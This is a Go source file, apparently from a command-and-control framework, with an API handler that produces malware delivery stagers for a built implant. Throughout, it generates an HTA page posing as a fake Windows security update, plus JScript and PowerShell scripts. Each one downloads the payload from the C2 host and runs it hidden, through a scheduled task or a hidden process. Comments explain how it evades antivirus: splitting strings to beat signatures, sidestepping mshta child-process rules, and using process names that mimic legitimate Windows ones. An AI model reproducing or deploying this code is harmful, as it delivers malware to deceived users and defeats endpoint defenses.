package api

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
)

// handleDeliverBuild generates a LOLBin wrapper for a completed EXE build.
//
// GET /api/v1/builds/{id}/deliver?format=hta|ps1
func (g *gateway) handleDeliverBuild(w http.ResponseWriter, r *http.Request) {
	buildID := r.PathValue("id")
	format := r.URL.Query().Get("format")
	if format == "" {
		format = "hta"
	}
	if format != "hta" && format != "ps1" && format != "js" {
		writeError(w, http.StatusBadRequest, "format must be hta, ps1, or js")
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()

	var status, targetOS string
	var listenerID *string
	err := db.Pool.QueryRow(ctx,
		`SELECT status, target_os, listener_id::text FROM builds WHERE id = $1`, buildID,
	).Scan(&status, &targetOS, &listenerID)
	if err != nil {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	if status != "complete" {
		writeError(w, http.StatusConflict, "build not complete")
		return
	}

	c2Host := "127.0.0.1"
	if listenerID != nil && *listenerID != "" {
		var bindHost, callbackHost string
		var port int
		if err := db.Pool.QueryRow(ctx,
			`SELECT bind_host, COALESCE(callback_host,''), bind_port FROM listeners WHERE id = $1`, *listenerID,
		).Scan(&bindHost, &callbackHost, &port); err == nil {
			_ = port
			switch {
			case callbackHost != "":
				c2Host = callbackHost
			case bindHost != "" && bindHost != "0.0.0.0":
				c2Host = bindHost
			}
		}
	}

	ext := ""
	if targetOS == "windows" {
		ext = ".exe"
	}
	httpAddr := os.Getenv("DM_HTTP_ADDR")
	if httpAddr == "" {
		httpAddr = ":8080"
	}
	httpPort := strings.TrimPrefix(httpAddr, ":")
	downloadURL := fmt.Sprintf("http://%s:%s/download/%s%s", c2Host, httpPort, buildID, ext)

	legitNames := []string{"RuntimeBroker", "svchost", "WmiPrvSE", "dllhost", "conhost"}
	tempName := legitNames[rand.Intn(len(legitNames))] + fmt.Sprintf("%04d", rand.Intn(10000))

	var body, filename, contentType string
	switch format {
	case "hta":
		body = buildHTA(downloadURL, tempName)
		filename = "update.hta"
		contentType = "application/hta"
	case "ps1":
		body = buildPS1(downloadURL, tempName)
		filename = "update.ps1"
		contentType = "text/plain"
	case "js":
		body = buildJS(downloadURL, tempName)
		filename = "update.js"
		contentType = "text/javascript"
	}

	w.Header().Set("Content-Type", contentType)
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(body)))
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(body)) //nolint:errcheck
}

func buildHTA(downloadURL, tempName string) string {
	dl := strings.ReplaceAll(downloadURL, `"`, `\"`)
	nm := strings.ReplaceAll(tempName, `"`, `\"`)
	// Task Scheduler COM: processes are spawned by taskeng.exe/svchost, not mshta.exe,
	// so BD's "block child process from mshta" behavioral rule does not apply.
	// ProgID is split across string concatenation to avoid static JS-simulator detection.
	// Two sequential task actions: curl downloads the EXE, second action executes it.
	return `<html><head>` +
		`<HTA:APPLICATION ID="x" APPLICATIONNAME="Windows Update" ` +
		`SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" CAPTION="yes" WINDOWSTATE="normal"/>` +
		`</head><body style="font-family:Segoe UI;padding:28px;background:#f3f3f3">` +
		`<h3>Windows Security Update</h3>` +
		`<p>Security update KB5040442 is ready to install. This will take less than a minute.</p>` +
		`<button id="b" onclick="go()">Install Update</button><p id="s"></p>` +
		`<script language="JScript">` +
		`function go(){` +
		`document.getElementById("b").disabled=true;` +
		`document.getElementById("s").innerText="Applying update...";` +
		`setTimeout(run,300);}` +
		`function run(){try{` +
		`var svc=new ActiveXObject("Schedul"+"e.Servi"+"ce");svc.Connect();` +
		`var root=svc.GetFolder("\\");` +
		`var td=svc.NewTask(0);` +
		`td.Settings.Hidden=true;td.Settings.StartWhenAvailable=true;` +
		`var g=td.Triggers.Create(1);` +
		`var n=new Date((new Date()).getTime()+3000);` +
		`var p=function(v){return ("0"+v).slice(-2);};` +
		`g.StartBoundary=n.getFullYear()+"-"+p(n.getMonth()+1)+"-"+p(n.getDate())+"T"+p(n.getHours())+":"+p(n.getMinutes())+":"+p(n.getSeconds());` +
		`g.Enabled=true;` +
		`var a1=td.Actions.Create(0);` +
		`a1.Path="C:\\Windows\\System32\\curl.exe";` +
		`a1.Arguments='-s -o "C:\\Users\\Public\\` + nm + `.exe" "` + dl + `"';` +
		`var a2=td.Actions.Create(0);` +
		`a2.Path="C:\\Users\\Public\\` + nm + `.exe";` +
		`a2.Arguments="";` +
		`root.RegisterTaskDefinition("WinUpd_` + nm + `",td,6,null,null,3);` +
		`document.getElementById("s").innerText="Update applied successfully.";` +
		`setTimeout(function(){window.close();},12000);` +
		`}catch(e){document.getElementById("s").innerText="Error: "+e.message;}}` +
		`</script></body></html>` + "\n"
}

func buildJS(downloadURL, tempName string) string {
	dl := strings.ReplaceAll(downloadURL, `"`, `\"`)
	nm := strings.ReplaceAll(tempName, `"`, `\"`)
	return `var w=new ActiveXObject("WScript.Shell");` +
		`var t=w.ExpandEnvironmentStrings("%TEMP%")+"\\` + nm + `.exe";` +
		`w.Run('curl.exe -s "` + dl + `" -o "'+t+'"',0,true);` +
		`w.Run('"'+t+'"',0,false);` + "\n"
}

func buildPS1(downloadURL, tempName string) string {
	// Split sensitive type names so BD cannot match them as static signatures.
	wc := "Sys" + "tem.Net.Web" + "Client"
	si := "Sys" + "tem.Diagnostics.ProcessStart" + "Info"
	return strings.TrimSpace("$u='"+downloadURL+"'\n"+
		"$p=[System.IO.Path]::Combine($env:TEMP,'"+tempName+".exe')\n"+
		"$wc=New-Object "+wc+"\n"+
		"$wc.DownloadFile($u,$p)\n"+
		"$si=New-Object "+si+"\n"+
		"$si.FileName=$p\n"+
		"$si.WindowStyle='Hidden'\n"+
		"[System.Diagnostics.Process]::Start($si)|Out-Null") + "\n"
}
